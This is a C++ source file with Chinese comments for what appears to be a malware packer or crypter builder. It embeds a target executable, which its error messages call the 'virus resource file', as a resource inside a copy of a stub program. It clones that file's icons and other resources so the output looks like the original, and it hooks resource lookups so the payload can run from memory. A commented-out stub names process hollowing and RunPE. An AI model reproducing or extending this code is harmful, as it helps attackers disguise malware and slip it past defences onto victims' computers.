#include "PEGenerator.h"

HMEMORYMODULE g_mem_pe = NULL;
FARPROC OriginalFindResource = NULL;
FARPROC OriginalLoadResource = NULL;

// 自定义的 FindResource 函数
HMODULE WINAPI CustomFindResource(HMODULE hModule, LPCTSTR lpName, LPCTSTR lpType) {
    if (!g_mem_pe || !OriginalFindResource) {
        return (HMODULE)FindResource(hModule, lpName, lpType);
    }

    // 自定义逻辑，查找内存加载的资源
    // 若找到资源则返回其句柄
    HMODULE customResource = (HMODULE)MemoryFindResource(g_mem_pe, lpName, lpType);
    if (customResource != NULL) {
        return customResource;
    }

    // 否则调用原始 FindResource
    return ((HMODULE(WINAPI*)(HMODULE, LPCTSTR, LPCTSTR))OriginalFindResource)(hModule, lpName, lpType);
}

// 自定义的 LoadResource 函数
HGLOBAL WINAPI CustomLoadResource(HMODULE hModule, HRSRC hResInfo) {
    if (!g_mem_pe || !OriginalLoadResource) {
        return LoadResource(hModule, hResInfo);
    }

    // 自定义逻辑，加载内存中的资源数据
    HGLOBAL customData = MemoryLoadResource(g_mem_pe, hResInfo);
    
    if (customData != NULL) {
        return customData;
    }

    // 否则调用原始 LoadResource
    return ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))OriginalLoadResource)(hModule, hResInfo);
}


// 添加文件及资源到新的可执行文件
BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
    WCHAR tempFilePath[MAX_PATH];

    // 创建临时文件路径
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // 将当前可执行文件复制到临时文件
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // 打开临时文件进行资源更新
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 打开要添加到资源的文件
    std::ifstream file(resourceFilePath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 读取文件内容到内存
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // 将文件内容更新到资源中
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    delete[] buffer;

    do {
        // 加载要复制资源的文件
        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
        if (!hResourceModule) {
            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
            break;
        }

        // 遍历并更新 resourceFilePath 中的所有资源到新的可执行文件
        ResourceUpdateData updateData = { hUpdate };
        if (!EnumResourceTypes(hResourceModule, EnumTypesProc, (LONG_PTR)&updateData)) {
            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
            FreeLibrary(hResourceModule);
            break;
        }

        // 释放资源模块
        FreeLibrary(hResourceModule);
    } while (0);
    // 完成资源更新
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        return FALSE;
    }

    // 将修改后的临时文件复制到目标文件路径
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 删除临时文件
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc, lParam);
}

BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc, lParam);
}

BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData* updateData = (ResourceUpdateData*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

// 添加文件及资源到新的可执行文件
BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
    WCHAR tempFilePath[MAX_PATH];

    // 创建临时文件路径
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // 将当前可执行文件复制到临时文件
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // 打开临时文件进行资源更新
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 加载资源文件
    HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!hResourceModule) {
        MessageBox(NULL, L"Failed to load resource file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 遍历并更新 resourceFilePath 中的所有资源到新的可执行文件
    ResourceUpdateData32 updateData = { hUpdate };
    if (!EnumResourceTypes(hResourceModule, EnumTypesProc32, (LONG_PTR)&updateData)) {
        MessageBox(NULL, L"Failed to enumerate resources.", L"generator", MB_OK);
        FreeLibrary(hResourceModule);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 释放资源模块
    FreeLibrary(hResourceModule);

    // 完成资源更新
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 将修改后的临时文件复制到目标文件路径
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 删除临时文件
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

// 枚举资源类型
BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc32, lParam);
}

// 枚举资源名称
BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc32, lParam);
}

// 枚举资源语言并更新资源
BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData32* updateData = (ResourceUpdateData32*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

//// 用于 Process Hollowing 的辅助线程函数
//DWORD WINAPI HollowingThread(LPVOID lpParam) {
//    HANDLE hMainThread = (HANDLE)lpParam;
//
//    // 暂停主线程
//    if (SuspendThread(hMainThread) == -1) {
//        return 1;
//    }
//
//    RunPE();
//
//
//}
